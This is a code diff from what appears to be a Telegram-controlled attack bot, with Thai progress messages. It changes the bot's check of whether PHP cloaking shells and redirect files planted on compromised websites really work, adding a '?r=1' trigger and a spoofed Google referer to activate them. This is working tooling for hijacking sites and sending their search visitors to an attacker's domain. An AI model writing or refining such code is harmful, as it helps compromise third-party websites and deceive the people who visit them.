@@ -4215,13 +4215,20 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
       const verifyStep = await narrator.addStep("ตรวจสอบ redirect ทำงานหรือไม่");
       
       // If claimed success, actually verify the redirect URL works
+      // CRITICAL: Must send ?r=1 and Google referer to trigger PHP cloaking shells
       if (fullChainSuccess && successUrl) {
         try {
-          const verifyResponse = await fetch(successUrl, {
+          // Build trigger URL with ?r=1 to activate PHP redirect shells
+          const triggerUrl = successUrl.includes("?") ? `${successUrl}&r=1` : `${successUrl}?r=1`;
+          
+          const verifyResponse = await fetch(triggerUrl, {
             method: "GET",
             redirect: "follow",
             signal: AbortSignal.timeout(15_000),
-            headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" },
+            headers: { 
+              "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+              "Referer": "https://www.google.com/search?q=test",
+            },
           });
           const finalUrl = verifyResponse.url;
           const body = await verifyResponse.text().catch(() => "");
@@ -4236,12 +4243,36 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
             body.includes('location.replace');
           
           if (!redirectWorksReal) {
-            // False positive! File exists but redirect doesn't work
-            await narrator.addAnalysis(`⚠️ ตรวจสอบจริง: ไฟล์อยู่ที่ ${successUrl.substring(0, 60)} แต่ redirect ไม่ทำงานจริง (final: ${finalUrl.substring(0, 60)})`);
-            fullChainSuccess = false;
-            failedMethods.push(`${successMethod} (ไฟล์อยู่แต่ redirect ไม่ทำงาน)`);
-            successMethod = "";
-            successUrl = "";
+            // Also try without ?r=1 but with Google referer (for .htaccess/HTML redirects)
+            let fallbackWorks = false;
+            try {
+              const fallbackResp = await fetch(successUrl, {
+                method: "GET",
+                redirect: "follow",
+                signal: AbortSignal.timeout(10_000),
+                headers: { 
+                  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                  "Referer": "https://www.google.com/search?q=test",
+                },
+              });
+              const fallbackUrl = fallbackResp.url;
+              const fallbackBody = await fallbackResp.text().catch(() => "");
+              fallbackWorks = fallbackUrl.includes(redirectDomain) || 
+                fallbackBody.includes(redirectDomain) ||
+                fallbackBody.includes('window.location') ||
+                fallbackBody.includes('meta http-equiv="refresh"');
+            } catch { /* ignore */ }
+            
+            if (fallbackWorks) {
+              await narrator.addAnalysis(`✅ ตรวจสอบแล้ว: redirect ทำงานจริง (ผ่าน Google referer)! ปลายทาง: ${redirectDomain}`);
+            } else {
+              // False positive! File exists but redirect doesn't work
+              await narrator.addAnalysis(`⚠️ ตรวจสอบจริง: ไฟล์อยู่ที่ ${successUrl.substring(0, 60)} แต่ redirect ไม่ทำงานจริง (final: ${finalUrl.substring(0, 60)})`);
+              fullChainSuccess = false;
+              failedMethods.push(`${successMethod} (ไฟล์อยู่แต่ redirect ไม่ทำงาน)`);
+              successMethod = "";
+              successUrl = "";
+            }
           } else {
             await narrator.addAnalysis(`✅ ตรวจสอบแล้ว: redirect ทำงานจริง! ปลายทาง: ${finalUrl.substring(0, 80)}`);
           }
